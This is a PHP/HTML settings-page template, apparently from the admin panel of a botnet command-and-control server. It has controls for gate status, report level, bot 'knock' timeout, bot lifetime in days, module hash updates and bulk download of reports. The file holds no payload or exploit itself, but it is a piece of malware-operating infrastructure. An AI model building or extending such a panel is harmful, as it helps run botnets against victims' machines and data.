<div class="page-title">
</div>

<div class="row">
    <div class="col-md-12">
        <div class="panel panel-white">
            <!--<div class="panel-heading"><h6 class="panel-title">Countries</h6></div>-->
            <div class="panel-body">
                <form role="form" action="javascript:void(0);">
                    <div class="form-group">
                        <label>Gate status</label>
                        <select class="select-full select2-offscreen" tabindex="-1" id="gate_status">
                            <option value="1" <?php if ($general_settings[3]['setting_value'] == 1) echo 'selected'; ?>>Enabled</option>
                            <option value="0" <?php if ($general_settings[3]['setting_value'] == 0) echo 'selected'; ?>>Disabled</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Report status</label>
                        <select class="select-full select2-offscreen" tabindex="-1" id="report_status">
                            <option value="1" <?php if ($general_settings[0]['setting_value'] == 1) echo 'selected'; ?>>Enabled</option>
                            <option value="0" <?php if ($general_settings[0]['setting_value'] == 0) echo 'selected'; ?>>Disabled</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Report level</label>
                        <select <?php if ($general_settings[0]['setting_value'] == 0) echo 'disabled';?> class="select-full select2-offscreen" tabindex="-1" id="report_level">
                            <option value="1" <?php if ($general_settings[1]['setting_value'] == 1) echo 'selected'; ?>>Low</option>
                            <option value="2" <?php if ($general_settings[1]['setting_value'] == 2) echo 'selected'; ?>>Middle</option>
                            <option value="3" <?php if ($general_settings[1]['setting_value'] == 3) echo 'selected'; ?>>High</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Knock timeout (min)</label>
                        <input id="knock_timeout" class="form-control" value="<?php echo $general_settings[2]['setting_value'];?>" placeholder="Enter timeout...">
                    </div>
                    <div class="form-group">
                        <label>Bot's lifetime (days)</label>
                        <input id="lifetime" class="form-control" value="<?php echo $general_settings[5]['setting_value'];?>" placeholder="Enter lifetime...">
                    </div>
                    <div class="form-group">
                        <button class="btn btn-default" onclick="updModules()">Update hashes for modules</button>
                        <button class="btn btn-default" onclick="location.href = '/settings/download_all_reports'">Download all reports</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>